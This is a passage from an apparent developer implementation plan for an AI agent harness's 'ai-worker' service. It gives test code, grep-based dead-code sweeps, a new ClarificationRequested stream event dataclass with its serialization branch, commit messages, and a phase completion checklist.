**Context:** Phase 2 Task 2.6 already made `query.py`'s `_execute_tool_call` forward `StreamEvent`s from tools. This task is a **verification pass** — no code changes, just running the existing agent loop tests with the new tools in scope to confirm that BashTool's `ThinkingStarted`/`ThinkingStopped` and SetPhaseTool's `PhaseChanged` flow through without being swallowed.

Implemented properly, Phase 2 already handled this case — the `async for item in tool.execute(...)` loop forwards anything that's a `StreamEvent`. But an integration test is cheap insurance.

- [ ] **Step 1: Write a focused integration test**

Create (or extend) `ai-worker/tests/test_agent_loop.py` with this test. If the file already exists, append; if not, add just the new test at the top of a new file in the correct location:

```python
# Append to ai-worker/tests/test_agent_loop.py (or create)

import pytest

from src.openharness.engine.stream_events import (
    PhaseChanged,
    StreamEvent,
    ThinkingStarted,
    ThinkingStopped,
    ToolExecutionCompleted,
    ToolExecutionStarted,
)
from src.openharness.tools.base import ToolRegistry


@pytest.mark.asyncio
async def test_set_phase_tool_integration_with_agent_loop(tmp_path, monkeypatch):
    """Verify that SetPhaseTool's PhaseChanged event flows through
    query._execute_tool_call without being swallowed.

    This exercises the Phase 2 Task 2.6 refactor (async-gen
    forwarding) end-to-end for a tool that actually yields
    StreamEvents.
    """
    from src.openharness.engine.messages import ConversationMessage
    from src.openharness.engine.query import QueryContext, _execute_tool_call
    from src.openharness.tools.phase_tool import SetPhaseTool

    registry = ToolRegistry()
    registry.register(SetPhaseTool())

    context = QueryContext(
        api_client=None,  # unused — we call _execute_tool_call directly
        tool_registry=registry,
        model="test",
        system_prompt="",
        max_tokens=4096,
        max_turns=1,
        cwd=tmp_path,
    )

    items = []
    async for item in _execute_tool_call(
        context=context,
        tool_name="set_phase",
        tool_use_id="toolu_test_1",
        tool_input={"phase": "Generate"},
    ):
        items.append(item)

    # Expected items (in order):
    #   1. PhaseChanged(phase='Generate') — yielded by SetPhaseTool
    #   2. ToolResultBlock (the wrapped ToolResult at the end)
    phase_events = [i for i in items if isinstance(i, PhaseChanged)]
    assert len(phase_events) == 1, f"PhaseChanged not forwarded: items={items}"
    assert phase_events[0].phase == "Generate"

    # The last item should be a ToolResultBlock (not a ToolResult directly —
    # _execute_tool_call wraps it)
    from src.openharness.engine.messages import ToolResultBlock
    assert isinstance(items[-1], ToolResultBlock)
    assert not items[-1].is_error
    assert items[-1].tool_use_id == "toolu_test_1"
```

- [ ] **Step 2: Run the test**

```bash
cd ai-worker && python -m pytest tests/test_agent_loop.py -v -k test_set_phase_tool_integration
```
Expected: pass. If `PhaseChanged` doesn't appear in `items`, `query.py`'s `_execute_tool_call` is swallowing StreamEvents — go back to Phase 2 Task 2.6 and fix.

- [ ] **Step 3: Smoke the whole agent loop suite**

```bash
cd ai-worker && python -m pytest tests/test_agent_loop.py tests/test_query_engine.py -v 2>&1 | tail -30
```
Expected: all green.

- [ ] **Step 4: Commit**

```bash
git add ai-worker/tests/test_agent_loop.py
git commit -m "test(agent-loop): verify PhaseChanged forwards through _execute_tool_call

Integration test that runs SetPhaseTool through query.py's
_execute_tool_call directly and asserts the PhaseChanged event
appears in the yielded items before the terminating
ToolResultBlock.

This is the end-to-end proof that Phase 2 Task 2.6's async-gen
forwarding works for tools that actually emit mid-execution
StreamEvents. SetPhaseTool is the simplest such tool
(two-yield execute: PhaseChanged then ToolResult) so it's the
cleanest test subject. BashTool's ThinkingStarted/ThinkingStopped
are covered by the bash test suite (Task 4.3) and the
adversarial suite (Task 4.5), so we don't repeat them here."
```

---

### Task 4.8: Dead-code sweep for legacy pair_pipeline event handlers

**Files:**
- Sweep: `ai-worker/src/`, `ai-worker/tests/`

**Context:** Final cleanup pass — any straggling references to the deleted `FixLoopStarted`/`FixLoopCompleted` events that weren't caught in Task 4.1's grep. This task exists because large refactors always leave stragglers and a dedicated cleanup task is cheaper than discovering them in Phase 5 or Phase 6.

- [ ] **Step 1: Grep for any remaining references**

```bash
grep -rn "FixLoop\|fix_loop" ai-worker/src/ ai-worker/tests/
```
Expected: zero matches. If there are any, they're dead and need deletion.

Also check for imports of the deleted class names in places the first grep might have missed (indirect imports via `__all__`):

```bash
grep -rn "from.*stream_events.*import.*FixLoop" ai-worker/
```
Expected: zero.

- [ ] **Step 2: Grep for dead event serialization branches**

```bash
grep -n "fix_loop_started\|fix_loop_completed\|FixLoopStarted\|FixLoopCompleted" ai-worker/src/api_server.py
```
Expected: zero. The `_serialize_event` function in api_server.py may have had branches for these that would cause an `AttributeError` at runtime but not a compile-time failure. Delete them.

If any matches: delete the matching branches and re-run the ai-worker tests.

- [ ] **Step 3: Run the full ai-worker test suite one more time**

```bash
cd ai-worker && python -m pytest tests/ -x --ignore=tests/e2e 2>&1 | tail -40
```
Expected: tests pass or skip with known reasons (missing DB, missing live LLM, missing bwrap on dev host). No `ImportError` on `FixLoop*`, no `AttributeError` on `FixLoopStarted`, no `KeyError` on `fix_loop_started`.

- [ ] **Step 4: Commit (even if nothing changed)**

If Step 1/2 found nothing, skip the commit (no-op).

If anything was deleted:

```bash
git add -u ai-worker/
git commit -m "chore(ai-worker): dead-code sweep for FixLoop* event handlers

Straggler references to the deleted FixLoopStarted/FixLoopCompleted
events that weren't caught by Task 4.1's grep. Usually one or two
branches in api_server.py's _serialize_event or a test that
constructed one of the deleted classes as setup.

Zero runtime behavior change — these branches were already unreachable
after Task 4.1 deleted the dataclasses (any reference would have
raised NameError on import). This commit is the paper trail."
```

---

### Task 4.9: Add `ClarificationRequested` stream event (Round 2)

**Files:**
- Modify: `ai-worker/src/openharness/engine/stream_events.py`
- Modify: `ai-worker/tests/openharness/test_stream_events_base.py`
- Modify: `ai-worker/src/api_server.py` (`_serialize_event` branch)

**Context:** Round 2 adds the `request_clarification` meta-tool (spec §2.9.2) which yields a new stream event `ClarificationRequested(question, tool_use_id)` mid-execution. Phase 4 is the right place to land the dataclass + serialization because all the other event dataclasses live here and Phase 5 / Phase 5a (which actually USE the event) depend on it being importable.

The event sits alongside the Round 1 events in `stream_events.py`. It carries:

- `question: str` — the text the agent wants the user to answer
- `tool_use_id: str` — threads through from `ToolExecutionStarted`/`ToolExecutionCompleted` so the frontend can correlate the input form with the right tool card and the backend can correlate the return-channel response with the right pending future (spec §2.9.2.b channel schema mandates this field)

Note ordering from spec §2.9.2.e: `ToolExecutionStarted → ClarificationRequested → [pause while user types] → ToolExecutionCompleted`. `ClarificationResponse` is a **channel message on Redis**, not a stream event — it is NOT added to `stream_events.py`. The frontend never sees `ClarificationResponse` directly; the response arrives via the user's HTTP POST to `/api/sessions/{id}/clarify` (Phase 5a Task 5a.6) which forge-core publishes to Redis pub/sub.

**Round 2 scope boundary:** Phase 4 only adds the event dataclass and its serialization. The `ClarificationCoordinator` / `ReturnChannel` / `RequestClarificationTool` that consume the event are in Phase 5a. The frontend component that renders it is in Phase 6 Task 6.10. This task is deliberately thin.

- [ ] **Step 1: Write the failing test first**

Open `ai-worker/tests/openharness/test_stream_events_base.py` and append:

```python
def test_clarification_requested_construction():
    evt = ClarificationRequested(
        question="What test framework should I use?",
        tool_use_id="toolu_abc123",
    )
    assert evt.question == "What test framework should I use?"
    assert evt.tool_use_id == "toolu_abc123"


def test_clarification_requested_is_frozen():
    evt = ClarificationRequested(question="x", tool_use_id="toolu_xyz")
    with pytest.raises(Exception):  # FrozenInstanceError or AttributeError
        evt.question = "y"  # type: ignore[misc]


def test_clarification_requested_subclasses_stream_event():
    assert issubclass(ClarificationRequested, StreamEvent)
```

Also add `ClarificationRequested` to the import block at the top of the test file:

```python
from src.openharness.engine.stream_events import (
    AssistantTextDelta,
    AssistantTurnComplete,
    ClarificationRequested,
    ErrorEvent,
    PhaseChanged,
    SessionComplete,
    StreamEvent,
    ThinkingStarted,
    ThinkingStopped,
    ToolExecutionCompleted,
    ToolExecutionStarted,
)
```

Update the `test_all_events_subclass_stream_event` test's iteration list to include `ClarificationRequested` alongside the existing events.

Run: `cd ai-worker && python -m pytest tests/openharness/test_stream_events_base.py::test_clarification_requested_construction -v`
Expected: `ImportError: cannot import name 'ClarificationRequested' from 'src.openharness.engine.stream_events'`. That's the TDD failure.

- [ ] **Step 2: Implement the dataclass**

Open `ai-worker/src/openharness/engine/stream_events.py` and append (keep the existing events unchanged):

```python
@dataclass(frozen=True)
class ClarificationRequested(StreamEvent):
    """Agent paused mid-tool-execution to ask the user a clarifying question.

    Emitted by RequestClarificationTool (see Phase 5a Task 5a.4) when the
    agent needs more information from the user. The tool awaits a response
    on the session's Redis return channel (agent:return:{session_id}) and
    yields ToolResult(output=<user_response>) once the response arrives.

    tool_use_id threads through from the surrounding ToolExecutionStarted
    event so the frontend can correlate the input form with the right
    tool card, and the backend can correlate the return-channel
    ClarificationResponse with the right pending future (§2.9.2.b).

    On timeout the session halts via ErrorEvent(recoverable=False) per
    §2.9.2.f — this event is not emitted again, the session just ends.
    """
    question: str
    tool_use_id: str
```

- [ ] **Step 3: Run the dataclass tests**

```bash
cd ai-worker && python -m pytest tests/openharness/test_stream_events_base.py -v
```

Expected: all previous tests still pass, plus the 3 new `test_clarification_requested_*` tests, plus the updated `test_all_events_subclass_stream_event` that now covers the new class.

- [ ] **Step 4: Add `_serialize_event` branch in `api_server.py`**

Find the `_serialize_event` function in `ai-worker/src/api_server.py` (it has one branch per existing event type). Add a new branch for `ClarificationRequested`:

```python
elif isinstance(event, ClarificationRequested):
    base["event_type"] = "clarification_requested"
    base["question"] = event.question
    base["tool_use_id"] = event.tool_use_id
```

Make sure `ClarificationRequested` is imported at the top of `api_server.py` alongside the other stream event imports.

- [ ] **Step 5: Write a serialization test**

If `api_server.py` has an existing serialization test file (e.g. `ai-worker/tests/test_api_server_serialize.py`), add:

```python
def test_serialize_clarification_requested():
    from src.api_server import _serialize_event
    from src.openharness.engine.stream_events import ClarificationRequested

    event = ClarificationRequested(
        question="What language should I use?",
        tool_use_id="toolu_xyz999",
    )
    payload = _serialize_event(event)
    assert payload["event_type"] == "clarification_requested"
    assert payload["question"] == "What language should I use?"
    assert payload["tool_use_id"] == "toolu_xyz999"
```

If no serialization test file exists yet, create one with just this test — it's small enough to justify a new file.

- [ ] **Step 6: Run the full stream-events + api-server test pass**

```bash
cd ai-worker && python -m pytest tests/openharness/test_stream_events_base.py tests/test_api_server_serialize.py -v
```

Expected: all tests pass. If `test_api_server_serialize.py` doesn't exist in Round 1, the command runs only the stream-events tests.

- [ ] **Step 7: Commit**

```bash
git add ai-worker/src/openharness/engine/stream_events.py \
        ai-worker/tests/openharness/test_stream_events_base.py \
        ai-worker/src/api_server.py \
        ai-worker/tests/test_api_server_serialize.py 2>/dev/null || true
git commit -m "$(cat <<'EOF'
feat(events): ClarificationRequested stream event (Round 2)

New StreamEvent dataclass for the request_clarification meta-tool
introduced in chronos Round 2 (spec §2.9.2). Carries the agent's
question and the tool_use_id so the frontend can render an input
form inline under the right tool card and the backend's return
channel (Phase 5a) can correlate the response back to the right
pending ClarificationCoordinator future.

Phase 4 only ships the dataclass + SSE serialization branch. The
tool that yields the event, the Redis pub/sub subscriber that
delivers the response, the QueryEngine pause/resume wiring, and
the forge-core clarify endpoint all land in Phase 5a. The frontend
component that renders the input form lands in Phase 6 Task 6.10.

ClarificationResponse is a Redis channel message, not a stream
event — it is deliberately NOT added to stream_events.py.

Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Phase 4 completion check

Before starting Phase 5:

- [ ] `pytest ai-worker/tests/openharness/test_stream_events_base.py -v` — 11 tests pass (PhaseChanged construction, tool_use_id fields, FixLoop gone sentinel, plus 3 ClarificationRequested tests from Task 4.9)
- [ ] `pytest ai-worker/tests/openharness/tools/test_phase_tool.py -v` — 11 tests pass
- [ ] `pytest ai-worker/tests/openharness/tools/test_bash_tool.py -v` — 17 tests pass (or appropriate skips)
- [ ] `pytest ai-worker/tests/openharness/tools/test_bash_adversarial.py -v` — **13 tests pass** (P0, zero skips inside container)
- [ ] `pytest ai-worker/tests/openharness/tools/test_base_tool_contract.py -v` — 48 tests pass (4 × 12)
- [ ] `pytest ai-worker/tests/test_agent_loop.py -v` — SetPhaseTool integration test passes
- [ ] `pytest ai-worker/tests/openharness/tools/ -v` — total Phase 2+3+4 tools tests: Phase 2 = 8 + 11 + 16 = 35, Phase 3 = ~53 + 40 (contract growth to 40) ... wait, contract suite counts are cumulative — don't double-count. Rough total: **~120 tool tests all green**
- [ ] `grep -rn "FixLoop" ai-worker/src/` returns nothing
- [ ] `grep -rn "if tool_name ==" ai-worker/src/openharness/engine/` returns nothing (no hardcoded special cases)
- [ ] `grep -n "SimpleTool" ai-worker/src/openharness/tools/bash_tool.py` returns nothing (BashTool extends BaseTool directly)
- [ ] `grep -n "SimpleTool" ai-worker/src/openharness/tools/phase_tool.py` returns nothing (SetPhaseTool extends BaseTool directly)
- [ ] Branch has **9 new commits** from this phase (one per task; Task 4.8 may be a no-op; Task 4.9 ships the Round 2 ClarificationRequested event)

## Phase 4 outputs unlock

- **Phase 5** can wire the full tool surface in `_create_engine`:
  ```python
  registry = ToolRegistry()
  register_context_tools(registry, profiles, project_id)  # 6 tools
  register_file_tools(registry, workspace_dir)            # 6 tools
  register_exec_tools(registry, workspace_dir)             # 2 tools
  # total: 14 tools
  ```
- **Phase 5** can reference `bash`, `set_phase`, `read_file`, `write_file`, `edit_file`, `glob`, `grep`, `list_directory` by name in the system prompt with exact semantics guaranteed by the Phase 2/3/4 tests.
- **Phase 6** frontend can consume `PhaseChanged` to drive the step ribbon and `ThinkingStarted`/`ThinkingStopped` to drive the loading pulse, both forwarded through the existing SSE infrastructure without any new event types.
- **Phase 7 e2e** can run real bash commands through the sandbox and verify the end-to-end flow: agent → BashTool → bwrap → workspace → result back to agent.
